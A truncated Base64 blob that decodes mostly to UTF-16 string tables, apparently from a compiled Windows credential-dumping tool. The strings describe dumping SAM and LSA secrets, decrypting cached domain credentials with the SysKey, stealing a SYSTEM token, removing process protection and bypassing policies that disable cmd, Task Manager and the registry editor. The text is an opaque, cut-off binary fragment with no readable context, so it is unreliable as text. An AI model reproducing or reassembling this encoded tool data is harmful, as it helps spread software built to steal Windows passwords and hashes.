BvAGMAZQBzAHMAIAA6ACAAJQBzAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFAAcgBvAGMAZQBzAHMASQBkAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAHAAaQBkAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAAQQByAGcAdQBtAGUAbgB0ACAALwBwAHIAbwBjAGUAcwBzADoAcAByAG8AZwByAGEAbQAuAGUAeABlACAAbwByACAALwBwAGkAZAA6AHAAcgBvAGMAZQBzAHMAaQBkACAAbgBlAGUAZABlAGQACgAAAAAAAAAAAFAASQBEACAAJQB1ACAALQA+ACAAJQAwADIAeAAvACUAMAAyAHgAIABbACUAMQB4AC0AJQAxAHgALQAlADEAeABdAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAATgBvACAAUABJAEQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAAUAByAG8AdABlAGMAdABlAGQAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGIAZQBmAG8AcgBlACAAVwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQAKAAAAAABmAHIAbwBtAAAAAAB0AG8AAAAAAAAAAABUAG8AawBlAG4AIABmAHIAbwBtACAAcAByAG8AYwBlAHMAcwAgACUAdQAgAHQAbwAgAHAAcgBvAGMAZQBzAHMAIAAlAHUACgAAAAAAAAAAACAAKgAgAGYAcgBvAG0AIAAwACAAdwBpAGwAbAAgAHQAYQBrAGUAIABTAFkAUwBUAEUATQAgAHQAbwBrAGUAbgAKAAAAAAAAACAAKgAgAHQAbwAgADAAIAB3AGkAbABsACAAdABhAGsAZQAgAGEAbABsACAAJwBjAG0AZAAnACAAYQBuAGQAIAAnAG0AaQBtAGkAawBhAHQAegAnACAAcAByAG8AYwBlAHMAcwAKAAAAVABhAHIAZwBlAHQAIAA9ACAAMAB4ACUAcAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AbgBvAHQAaQBmAHkARwBlAG4AZQByAGkAYwBSAGUAbQBvAHYAZQAgADsAIABOAG8AIABhAGQAZAByAGUAcwBzAD8ACgAAAAAASwBlAHIAYgBlAHIAbwBzAC0ATgBlAHcAZQByAC0ASwBlAHkAcwAAAEsAZQByAGIAZQByAG8AcwAAAAAAVwBEAGkAZwBlAHMAdAAAAEMATABFAEEAUgBUAEUAWABUAAAAUAByAGkAbQBhAHIAeQAAAGsAZQByAG4AZQBsADMAMgAuAGQAbABsAAAAAABuAHQAZABsAGwALgBkAGwAbAAAAGwAcwBhAHMAcgB2AC4AZABsAGwAAAAAAHMAYQBtAHMAcgB2AC4AZABsAGwAAAAAAEQAYQB0AGEAAAAAAEcAQgBHAAAAUwBrAGUAdwAxAAAASgBEAAAAAABEAGUAZgBhAHUAbAB0AAAAQwB1AHIAcgBlAG4AdAAAAEEAcwBrACAATABTAEEAIABTAGUAcgB2AGUAcgAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAFMAQQBNAC8AQQBEACAAZQBuAHQAcgBpAGUAcwAgACgAbgBvAHIAbQBhAGwALAAgAHAAYQB0AGMAaAAgAG8AbgAgAHQAaABlACAAZgBsAHkAIABvAHIAIABpAG4AagBlAGMAdAApAAAAAABsAHMAYQAAAEcAZQB0ACAAdABoAGUAIABTAHkAcwBLAGUAeQAgAHQAbwAgAGQAZQBjAHIAeQBwAHQAIABOAEwAJABLAE0AIAB0AGgAZQBuACAATQBTAEMAYQBjAGgAZQAoAHYAMgApACAAKABmAHIAbwBtACAAcgBlAGcAaQBzAHQAcgB5ACAAbwByACAAaABpAHYAZQBzACkAAABjAGEAYwBoAGUAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAAUwBFAEMAUgBFAFQAUwAgAGUAbgB0AHIAaQBlAHMAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAcwBlAGMAcgBlAHQAcwAAAEcAZQB0ACAAdABoAGUAIABTAHkAcwBLAGUAeQAgAHQAbwAgAGQAZQBjAHIAeQBwAHQAIABTAEEATQAgAGUAbgB0AHIAaQBlAHMAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAcwBhAG0AAABMAHMAYQBEAHUAbQBwACAAbQBvAGQAdQBsAGUAAAAAAGwAcwBhAGQAdQBtAHAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAFkAUwBUAEUATQAgAGgAaQB2AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoAFMAQQBNACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFMAWQBTAFQARQBNAAAAAABTAEEATQAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAYQBtACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIAAoAFMAQQBNACkAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAEMAYQBjAGgAZQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAEUAQwBVAFIASQBUAFkAIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAcgBlAHQAcwBPAHIAQwBhAGMAaABlACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoAFMAWQBTAFQARQBNACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFMARQBDAFUAUgBJAFQAWQAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAcgBlAHQAcwBPAHIAQwBhAGMAaABlACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIAAoAFMARQBDAFUAUgBJAFQAWQApACAAKAAwAHgAJQAwADgAeAApAAoAAABDAG8AbgB0AHIAbwBsAFMAZQB0ADAAMAAwAAAAUwBlAGwAZQBjAHQAAAAAACUAMAAzAHUAAAAAACUAeAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwB5AHMAawBlAHkAIAA7ACAATABTAEEAIABLAGUAeQAgAEMAbABhAHMAcwAgAHIAZQBhAGQAIABlAHIAcgBvAHIACgAAAAAARABvAG0AYQBpAG4AIAA6ACAAAAAAAAAAQwBvAG4AdAByAG8AbABcAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAFwAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAAABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAAAAAAJQBzAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAcAByAGUAIAAtACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABLAE8ACgAAAFMAeQBzAEsAZQB5ACAAOgAgAAAAQwBvAG4AdAByAG8AbABcAEwAUwBBAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAeQBzAGsAZQB5ACAASwBPAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAEwAUwBBACAASwBPAAoAAAAAAFMAQQBNAFwARABvAG0AYQBpAG4AcwBcAEEAYwBjAG8AdQBuAHQAAABVAHMAZQByAHMAAABOAGEAbQBlAHMAAAAKAFIASQBEACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAVgAAAFUAcwBlAHIAIAA6ACAAJQAuACoAcwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAVQBzAGUAcgBzAEEAbgBkAFMAYQBtAEsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABWACAASwBPAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABwAHIAZQAgAC0AIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAVgAgAEsATwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAVQBzAGUAcgBzAEEAbgBkAFMAYQBtAEsAZQB5ACAAOwAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEsAZQAgAEsATwAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFUAcwBlAHIAcwBBAG4AZABTAGEAbQBLAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAUwBBAE0AIABBAGMAYwBvAHUAbgB0AHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAATgBUAEwATQAAAAAATABNACAAIAAAAAAAJQBzACAAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQASABhAHMAaAAgADsAIABSAHQAbABEAGUAYwByAHkAcAB0AEQARQBTADIAYgBsAG8AYwBrAHMAMQBEAFcATwBSAEQAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQASABhAHMAaAAgADsAIABSAHQAbABFAG4AYwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAQQBSAEMANAAAAAAACgBTAEEATQBLAGUAeQAgADoAIAAAAAAARgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAYQBtAEsAZQB5ACAAOwAgAFIAdABsAEUAbgBjAHIAeQBwAHQARABlAGMAcgB5AHAAdABBAFIAQwA0ACAASwBPAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAYQBtAEsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABGACAASwBPAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AFMAYQBtAEsAZQB5ACAAOwAgAHAAcgBlACAALQAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABGACAASwBPAAAAUABvAGwAaQBjAHkAAAAAAFAAbwBsAFIAZQB2AGkAcwBpAG8AbgAAAAoAUABvAGwAaQBjAHkAIABzAHUAYgBzAHkAcwB0AGUAbQAgAGkAcwAgADoAIAAlAGgAdQAuACUAaAB1AAoAAABQAG8AbABFAEsATABpAHMAdAAAAFAAbwBsAFMAZQBjAHIAZQB0AEUAbgBjAHIAeQBwAHQAaQBvAG4ASwBlAHkAAAAAAEwAUwBBACAASwBlAHkAKABzACkAIAA6ACAAJQB1ACwAIABkAGUAZgBhAHUAbAB0ACAAAAAgACAAWwAlADAAMgB1AF0AIAAAACAAAABMAFMAQQAgAEsAZQB5ACAAOgAgAAAAAABTAGUAYwByAGUAdABzAAAAcwBlAHIAdgBpAGMAZQBzAAAAAAAKAFMAZQBjAHIAZQB0ACAAIAA6ACAAJQBzAAAAXwBTAEMAXwAAAAAAQwB1AHIAcgBWAGEAbAAAAAoAYwB1AHIALwAAAE8AbABkAFYAYQBsAAAAAAAKAG8AbABkAC8AAABTAGUAYwByAGUAdABzAFwATgBMACQASwBNAFwAQwB1AHIAcgBWAGEAbAAAAEMAYQBjAGgAZQAAAE4ATAAkAEkAdABlAHIAYQB0AGkAbwBuAEMAbwB1AG4AdAAAACoAIABOAEwAJABJAHQAZQByAGEAdABpAG8AbgBDAG8AdQBuAHQAIABpAHMAIAAlAHUALAAgACUAdQAgAHIAZQBhAGwAIABpAHQAZQByAGEAdABpAG8AbgAoAHMAKQAKAAAAAAAqACAARABDAEMAMQAgAG0AbwBkAGUAIAAhAAoAAAAAAAAAAAAqACAASQB0AGUAcgBhAHQAaQBvAG4AIABpAHMAIABzAGUAdAAgAHQAbwAgAGQAZQBmAGEAdQBsAHQAIAAoADEAMAAyADQAMAApAAoAAAAAAE4ATAAkAEMAbwBuAHQAcgBvAGwAAAAAAAoAWwAlAHMAIAAtACAAAABdAAoAUgBJAEQAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AE4ATABLAE0AUwBlAGMAcgBlAHQAQQBuAGQAQwBhAGMAaABlACAAOwAgAEMAcgB5AHAAdABEAGUAYwByAHkAcAB0ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABDAHIAeQBwAHQAUwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABDAHIAeQBwAHQASQBtAHAAbwByAHQASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABOAEwASwBNAFMAZQBjAHIAZQB0AEEAbgBkAEMAYQBjAGgAZQAgADsAIABSAHQAbABFAG4AYwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAUgBDADQAIAA6ACAAMAB4ACUAMAA4AHgACgAAAFUAcwBlAHIAIAAgACAAIAAgACAAOgAgACUALgAqAHMAXAAlAC4AKgBzAAoAAAAAAE0AcwBDAGEAYwBoAGUAVgAlAGMAIAA6ACAAAABPAGIAagBlAGMAdABOAGEAbQBlAAAAAAAAAAAAIAAvACAAcwBlAHIAdgBpAGMAZQAgACcAJQBzACcAIAB3AGkAdABoACAAdQBzAGUAcgBuAGEAbQBlACAAOgAgACUAcwAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZABlAGMAcgB5AHAAdABTAGUAYwByAGUAdAAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAUwBlAGMAcgBlAHQAIAB2AGEAbAB1AGUAIABLAE8ACgAAACQATQBBAEMASABJAE4ARQAuAEEAQwBDAAAAAABOAFQATABNADoAAAAvAAAAdABlAHgAdAA6ACAAJQB3AFoAAABoAGUAeAAgADoAIAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAF8AYQBlAHMAMgA1ADYAIAA7ACAAQwByAHkAcAB0AEQAZQBjAHIAeQBwAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAF8AYQBlAHMAMgA1ADYAIAA7ACAAQwByAHkAcAB0AEkAbQBwAG8AcgB0AEsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFNhbUlDb25uZWN0AFNhbXJDbG9zZUhhbmRsZQBTYW1JUmV0cmlldmVQcmltYXJ5Q3JlZGVudGlhbHMAAFNhbXJPcGVuRG9tYWluAABTYW1yT3BlblVzZXIAAAAAU2FtclF1ZXJ5SW5mb3JtYXRpb25Vc2VyAAAAAFNhbUlGcmVlX1NBTVBSX1VTRVJfSU5GT19CVUZGRVIATHNhSVF1ZXJ5SW5mb3JtYXRpb25Qb2xpY3lUcnVzdGVkAAAATHNhSUZyZWVfTFNBUFJfUE9MSUNZX0lORk9STUFUSU9OAAAAVmlydHVhbEFsbG9jAAAAAExvY2FsRnJlZQAAAG1lbWNweQAAcABhAHQAYwBoAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAABpAG4AagBlAGMAdAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBDAG8AZABlAFcAaQB0AHQAaABQAGEAdAB0AGUAcgBuAFIAZQBwAGwAYQBjAGUACgAAAAAARABvAG0AYQBpAG4AIAA6ACAAJQB3AFoAIAAvACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAUwBhAG0ATABvAG8AawB1AHAASQBkAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhACAAOwAgACcAJQBzACcAIABpAHMAIABuAG8AdAAgAGEAIAB2AGEAbABpAGQAIABJAGQACgAAAAAAbgBhAG0AZQAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhACAAOwAgAFMAYQBtAEwAbwBvAGsAdQBwAE4AYQBtAGUAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBVAHMAZQByAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBPAHAAZQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBDAG8AbgBuAGUAYwB0ACAAJQAwADgAeAAKAAAAUwBhAG0AUwBzAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhAF8AZwBlAHQASABhAG4AZABsAGUAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhAF8AZwBlAHQASABhAG4AZABsAGUAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAKAFIASQBEACAAIAA6ACAAJQAwADgAeAAgACgAJQB1ACkACgBVAHMAZQByACAAOgAgACUAdwBaAAoAAABMAE0AIAAgACAAOgAgAAAACgBOAFQATABNACAAOgAgAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQBfAHUAcwBlAHIAIAA7ACAAUwBhAG0AUQB1AGUAcgB5AEkAbgBmAG8AcgBtAGEAdABpAG8AbgBVAHMAZQByACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhAF8AdQBzAGUAcgAgADsAIABTAGEAbQBPAHAAZQBuAFUAcwBlAHIAIAAlADAAOAB4AAoAAAB1AG4AawBuAG8AdwBuAAAACgAgACoAIAAlAHMACgAAACAAIAAgACAATABNACAAIAAgADoAIAAAAAoAIAAgACAAIABOAFQATABNACAAOgAgAAAAAAAgACAAIAAgACUALgAqAHMACgAAACAAIAAgACAAJQAwADIAdQAgACAAAAAAACAAIAAgACAARABlAGYAYQB1AGwAdAAgAFMAYQBsAHQAIAA6ACAAJQAuACoAcwAKAAAAAABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABPAGwAZABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAACAAIAAgACAARABlAGYAYQB1AGwAdAAgAFMAYQBsAHQAIAA6ACAAJQAuACoAcwAKACAAIAAgACAARABlAGYAYQB1AGwAdAAgAEkAdABlAHIAYQB0AGkAbwBuAHMAIAA6ACAAJQB1AAoAAAAAAFMAZQByAHYAaQBjAGUAQwByAGUAZABlAG4AdABpAGEAbABzAAAAAABPAGwAZABlAHIAQwByAGUAZABlAG4AdABpAGEAbABzAAAAAAAgACAAIAAgACUAcwAKAAAAIAAgACAAIAAgACAAJQBzACAAOgAgAAAAIAAgACAAIAAgACAAJQBzACAAKAAlAHUAKQAgADoAIAAAAAAAbQBzAHYAYwByAHQALgBkAGwAbAAAAAAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbgBnAAAAAABkAGkAcwBjAG8AdgBlAHIAaQBuAGcAAABhAHMAcwBvAGMAaQBhAHQAaQBuAGcAAABkAGkAcwBjAG8AbgBuAGUAYwB0AGUAZAAAAAAAZABpAHMAYwBvAG4AbgBlAGMAdABpAG4AZwAAAGEAZABfAGgAbwBjAF8AbgBlAHQAdwBvAHIAawBfAGYAbwByAG0AZQBkAAAAYwBvAG4AbgBlAGMAdABlAGQAAABuAG8AdABfAHIAZQBhAGQAeQAAAHMAawBlAGwAZQB0AG8AbgAAAAAAbQBlAG0AcwBzAHAAAAAAAHcAaQBmAGkAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFQAcgB5ACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABhAGwAbAAgAG0AbwBkAHUAbABlAHMAIAB3AGkAdABoACAARABlAHQAbwB1AHIAcwAtAGwAaQBrAGUAIABoAG8AbwBrAHMAAABkAGUAdABvAHUAcgBzAAAASgB1AG4AaQBwAGUAcgAgAE4AZQB0AHcAbwByAGsAIABDAG8AbgBuAGUAYwB0ACAAKAB3AGkAdABoAG8AdQB0ACAAcgBvAHUAdABlACAAbQBvAG4AaQB0AG8AcgBpAG4AZwApAAAAAABuAGMAcgBvAHUAdABlAG0AbwBuAAAAAABUAGEAcwBrACAATQBhAG4AYQBnAGUAcgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAKQAAAAAAdABhAHMAawBtAGcAcgAAAAAAAABSAGUAZwBpAHMAdAByAHkAIABFAGQAaQB0AG8AcgAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAKQAAAAAAcgBlAGcAZQBkAGkAdAAAAEMAbwBtAG0AYQBuAGQAIABQAHIAbwBtAHAAdAAgACAAIAAgACAAIAAgACAAIAAgACgAdwBpAHQAaABvAHUAdAAgAEQAaQBzAGEAYgBsAGUAQwBNAEQAKQAAAAAAYwBtAGQAAABNAGkAcwBjAGUAbABsAGEAbgBlAG8AdQBzACAAbQBvAGQAdQBsAGUAAAAAAG0AaQBzAGMAAAAAAHcAbABhAG4AYQBwAGkAAABXbGFuT3BlbkhhbmRsZQAAV2xhbkNsb3NlSGFuZGxlAFdsYW5FbnVtSW50ZXJmYWNlcwAAV2xhbkdldFByb2ZpbGVMaXN0AABXbGFuR2V0UHJvZmlsZQAAV2xhbkZyZWVNZW1vcnkAAEsAaQB3AGkAQQBuAGQAQwBNAEQAAAAAAEQAaQBzAGEAYgBsAGUAQwBNAEQAAAAAAGMAbQBkAC4AZQB4AGUAAABLAGkAdwBpAEEAbgBkAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAAAAAAEQAaQBzAGEAYgBsAGUAUgBlAGcAaQBzAHQAcgB5AFQAbwBvAGwAcwAAAAAAcgBlAGcAZQBkAGkAdAAuAGUAeABlAAAASwBpAHcAaQBBAG4AZABUAGEAcwBrAE0AZwByAAAAAABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAAAAAAHQAYQBzAGsAbQBnAHIALgBlAHgAZQAAAGQAcwBOAGMAUwBlAHIAdgBpAGMAZQAAAAkAKAAlAHcAWgApAAAAAAAJAFsAJQB1AF0AIAAlAHcAWgAgACEAIAAAAAAAJQAtADMAMgBTAAAAIwAgACUAdQAAAAAACQAgACUAcAAgAC0APgAgACUAcAAAAAAAJQB3AFoAIAAoACUAdQApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0